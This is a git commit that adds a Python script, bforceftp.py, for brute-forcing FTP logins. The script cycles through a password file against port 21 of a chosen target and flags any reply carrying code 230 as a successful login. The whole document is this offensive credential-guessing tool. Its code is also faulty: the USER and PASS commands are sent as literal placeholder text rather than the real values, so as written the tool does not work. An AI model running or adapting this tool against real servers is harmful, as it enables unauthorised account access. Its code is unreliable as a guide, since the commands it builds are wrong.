b17c0ca038d17ae7aeb88c2472123d7972f31087
Danilo Albuquerque <cin_dmoraes@uolinc.com>
2022-11-09 18:55:25 -0300

    adding some codes - brute force in ftp services file

---
+++ bforceftp.py
@@ -0,0 +1,41 @@
+#!/usr/bin/python3
+
+import socket
+import sys
+import re
+
+if len(sys.argv) < 4:
+	print('')
+	print('Usage: python3 bforceftp.py <target> <user> <passwd-file.txt>')
+	print('')
+	sys.exit()
+else:
+	print('')
+	print('Brute Force FTP service')
+	print('')
+	print('')
+
+	target = sys.argv[1]
+	user = sys.argv[2]
+	f = open(sys.argv[3])
+
+	for passwd in f.readlines():
+		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+		s.connect((target,21))
+		s.recv(1024)
+
+		s.send(b"USER {user}\r\n")
+		s.recv(1024)
+		s.send(b"PASS {passwd}\r\n")
+		ans = s.recv(1024)
+		s.send(b"QUIT\r\n")
+
+		print(f'[+] Testing {user}:{passwd}...')
+
+		if re.search('230', ans.decode()):
+			print(f'[*] Password found ---> {user}:{passwd}')
+			print('')
+		else:
+			print('[*] Access Denied.')
+			print('-' * 55)
+			print('')
